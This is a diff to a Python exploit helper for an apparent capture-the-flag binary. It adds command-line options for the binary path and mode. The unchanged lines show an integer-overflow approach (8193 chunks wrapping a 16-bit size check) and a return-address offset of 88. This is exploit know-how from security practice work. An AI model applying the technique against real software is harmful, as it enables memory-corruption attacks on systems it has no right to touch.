@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import argparse
 import os
 import pty
 import re
@@ -11,6 +12,7 @@ import time
 
 CHUNK_COUNT = 8193  # 8193 * 8 = 65544, but uint16_t check sees only 8.
 RET_OFFSET = 88
+DEFAULT_BINARY = "./challenge-io"
 
 
 def read_until(fd: int, marker: str, timeout: float = 2.0) -> bytes:
@@ -48,6 +50,21 @@ def read_rest(fd: int, timeout: float = 1.0) -> bytes:
 
 
 def main() -> None:
+    parser = argparse.ArgumentParser(description="Integer overflow exploit helper")
+    parser.add_argument(
+        "--binary",
+        default=DEFAULT_BINARY,
+        help=f"path to the challenge binary (default: {DEFAULT_BINARY})",
+    )
+    parser.add_argument(
+        "--mode",
+        choices=["local", "remote"],
+        default="local",
+        help="mode (local only for this exploit, default: local)",
+    )
+    args = parser.parse_args()
+
+    binary_path = args.binary
     master_fd, slave_fd = pty.openpty()
     attrs = termios.tcgetattr(slave_fd)
     attrs[3] &= ~(termios.ECHO | termios.ICANON)
@@ -61,7 +78,7 @@ def main() -> None:
         os.dup2(slave_fd, 2)
         os.close(master_fd)
         os.close(slave_fd)
-        os.execv("./challenge", ["./challenge"])
+        os.execv(binary_path, [binary_path])
 
     os.close(slave_fd)
 
